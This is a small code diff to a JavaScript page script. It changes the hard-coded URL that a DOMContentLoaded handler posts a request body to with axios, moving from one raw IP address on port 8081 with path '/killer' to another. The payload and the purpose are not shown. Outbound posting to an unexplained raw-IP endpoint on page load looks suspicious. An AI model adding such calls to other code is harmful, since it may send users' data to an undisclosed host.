@@ -28,7 +28,7 @@ document.addEventListener("DOMContentLoaded", function () {
             }
         };
 
-        const url = 'http://80.242.57.251:8081/killer';
+        const url = 'https://85.192.48.69:8081/killer';
 
         try {
             await axios.post(url, requestBody);
